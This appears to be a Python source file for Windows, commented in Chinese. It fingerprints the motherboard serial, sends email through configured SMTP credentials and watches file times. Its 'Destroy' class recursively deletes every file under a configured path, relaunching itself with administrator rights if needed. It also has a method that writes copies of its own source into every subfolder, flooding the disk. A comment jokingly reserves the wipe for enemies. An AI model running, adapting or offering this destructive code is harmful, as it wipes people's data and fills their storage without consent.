import os,sys
try:
    import wmi
except ModuleNotFoundError:
    os.system('pip3 install wmi')
import time
import uuid
import shutil
import ctypes
import hashlib
import smtplib
from email.mime.text import MIMEText
from config import email_id,\
    email_port,email_to,email_pwd,\
    email_from,content,subject,path

#允许以管理员权限运行
def in_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

class Attribute(object):
    # 附加功能类
    def __init__(self):
        self.e_from = email_from
        self.e_pwd = email_pwd
        self.e_to = email_to
        self.port = email_port
        self.e_id = email_id

    def emil_min(self):
        #邮件内容支持HTM格式
        Email = MIMEText(content, "html", "utf-8")
        Email['Subject'] = subject
        Email['From'] = self.e_from
        Email['To'] = self.e_to
        s = smtplib.SMTP_SSL(self.e_id, self.port)  # 邮件服务器及端口号
        s.login(self.e_from, self.e_pwd)
        s.sendmail(self.e_from, self.e_to, Email.as_string())
        s.quit()

    def BIOS_board(self):
        # 获取BIOS和主板信息（特征码）
        w = wmi.WMI()
        board = w.Win32_BaseBoard()
        for i in board:
            ha_ber = hashlib.sha1(str(i.SerialNumber).encode('utf8'))
            br = ha_ber.hexdigest()
            text = hashlib.sha1(br.encode("utf8"))
            id = uuid.uuid5(uuid.NAMESPACE_DNS, text.hexdigest())
            with open('Serialnumber.txt', 'a+') as f:
                f.write(str(id) + '\n')

    def Whitelists(self):
        pass

    def control(self,path, name):
        # 文件监控
        # st_atime(访问时间), st_mtime(修改时间), st_ctime（创建时间)
        suffer = os.path.join(path, name)
        statinfo = os.stat(suffer)
        return time.strftime('%Y.%m.%d.%X', time.localtime(statinfo.st_mtime))


class Destroy(object):
    # 附加负面影响属性类,谨慎使用的类，易诱发不良后果，特别是第一个方法不是仇人就不要乱搞
    def __init__(self):
        self.del_path = path

    def delfile(self):
        # 递归删除文件夹及其文件方法
        if in_admin():
            try:
                file_li = os.listdir(self.del_path)
                for i in file_li:
                    file_path = os.path.join(self.del_path, i)
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                    elif os.path.isdir(file_path):
                        shutil.rmtree(file_path, True)
            except PermissionError:
                pass
        else:
            if sys.version_info[0] == 3:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

    def junk(self,ppach,n):
        #生成大量垃圾无用文件
        file_li = []
        for a, b, c in os.walk(ppach):
            file_li.append(str(a))
        for i in file_li:
            f_path = os.path.join(ppach, i)
            if os.path.isdir(f_path):
                with open(__file__, 'r', encoding='utf-8') as f:
                    a = f.read()
                file_path = os.path.join(f_path, __file__)
                name = os.path.basename(file_path)
                (filename, listname) = os.path.splitext(name)
                for i in range(1, int(n)):
                    file = os.path.join(f_path, filename + str(i) + listname)
                    try:
                        with open(file, 'w') as f:
                            f.write(str(a))
                    except PermissionError:
                        pass

#108-19=89